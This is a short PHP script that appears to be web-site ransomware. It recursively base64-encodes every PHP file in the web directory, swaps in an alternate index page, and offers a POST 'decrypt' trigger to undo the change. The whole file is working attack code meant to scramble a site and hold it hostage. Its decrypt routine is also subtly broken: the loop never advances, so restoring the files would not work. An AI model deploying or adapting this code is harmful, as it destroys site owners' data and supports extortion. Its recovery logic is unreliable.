<?php
function getdir($dir, &$results = array()) {
	$files = scandir($dir);
	foreach ($files as $key => $value) {
		$path = realpath($dir.DIRECTORY_SEPARATOR.$value);
		if (!is_dir($path)) {
			$results[] = $path;
		} else if ($value != "." && $value != "..") {
			getdir($path, $results);
			$results[] = $path;
		}
	}
	return $results;
}

function encweb() {
	$dirlist = getdir('./');
	$i = 0;
	while (isset($dirlist[$i])) {
		$cfile = explode('.', $dirlist[$i]);
		$cfile = array_reverse($cfile);
		$excfile = explode('/', $cfile[1]);
		$excfile = array_reverse($excfile);
		
		if ((string)$excfile[0] != 'index' and (string)$excfile[0] != 'exethis!' and (string)$excfile[0] != 'altindex') {
			if ((string)$cfile[0] == 'php') { 
				$encryptfile = file_get_contents($dirlist[$i]);
				$encrypted = base64_encode($encryptfile);
				$fp = fopen($dirlist[$i], 'r+');
				fwrite($fp, $encrypted);
				fclose($fp);
			}
		}
		$i++;
	}
	rename('./index.php', './old_index.php');
	rename('./altindex.php', './index.php');
	file_put_contents("./executed", "1");
	/*
	if (file_exists("./executed")) {
		echo "
			<script type = 'text/javascript'>
				alert('success');
			</script>
			";
	}
	*/
}

function decweb() {
	unlink('./index.php');
	unlink('./executed');
	rename('./old_index.php', './index.php');
	$dirlist = getdir('./');
	$i = 0;
	while (isset($dirlist[$i])) {
		$cfile = explode('.', $dirlist[$i]);
		$cfile = array_reverse($cfile);
		if ((string)$cfile[0] == 'php') { 
			$decryptfile = file_get_contents($dirlist[$i]);
			$decryptfile = strtr($decryptfile, array('-' => '+', '_' => '/'));
			$decrypted = base64_decode($decryptfile);
			$fp = fopen($dirlist[$i], 'r+');
			fwrite($fp, $decrypted);
			fclose($fp);
		}
	}
	unlink('./exethis!.php');
}

if (array_key_exists('decrypt', $_POST)) {
	decweb();
} else {
	if (!file_exists('./executed')) {
		encweb();
	} else {
		header('Location: ./index.php');
	}
}
?>
